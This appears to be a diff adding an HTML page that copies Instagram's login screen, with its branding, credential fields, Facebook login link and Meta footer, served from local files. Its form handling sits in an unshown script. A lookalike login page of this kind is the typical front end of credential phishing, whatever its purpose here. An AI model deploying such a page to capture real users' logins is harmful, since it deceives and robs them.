@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram • Login</title>
+  <link rel="stylesheet" href="/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+  <script src="/app.js" defer></script>
+</head>
+<body>
+  <div class="page">
+    <main class="login-container">
+      <div class="login-box">
+        <div class="logo">
+          <span class="logo-text">Instagram</span>
+        </div>
+
+        <form id="loginForm" class="login-form">
+          <div class="input-group">
+            <input
+              id="username"
+              name="username"
+              type="text"
+              placeholder="Phone number, username, or email"
+              autocomplete="username"
+              maxlength="100"
+              required
+            />
+          </div>
+
+          <div class="input-group">
+            <input
+              id="password"
+              name="password"
+              type="password"
+              placeholder="Password"
+              autocomplete="current-password"
+              maxlength="1000"
+              required
+            />
+          </div>
+
+          <button type="submit" class="login-btn" id="loginBtn">
+            Log in
+          </button>
+        </form>
+
+        <p id="message" role="status" aria-live="polite"></p>
+
+        <div class="separator">
+          <div class="line"></div>
+          <span>OR</span>
+          <div class="line"></div>
+        </div>
+
+        <a href="#" class="facebook-login">
+          <svg aria-label="Log in with Facebook" class="fb-icon" fill="currentColor" height="16" role="img" viewBox="0 0 16 16" width="16">
+            <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm1.9 8.2H8.7v5.6H6.5V8.2H5.1V6.4h1.4V5.2c0-1.9.9-2.9 2.9-2.9.8 0 1.5.1 1.7.1v2h-1.2c-.9 0-1.1.4-1.1 1.1v1.1h2.2l-.3 1.8z"></path>
+          </svg>
+          Log in with Facebook
+        </a>
+
+        <a href="#" class="forgot-password">Forgot password?</a>
+      </div>
+
+      <div class="signup-box">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div class="footer-bottom">
+        <span>English (UK)</span>
+        <span>© 2026 Instagram from Meta</span>
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
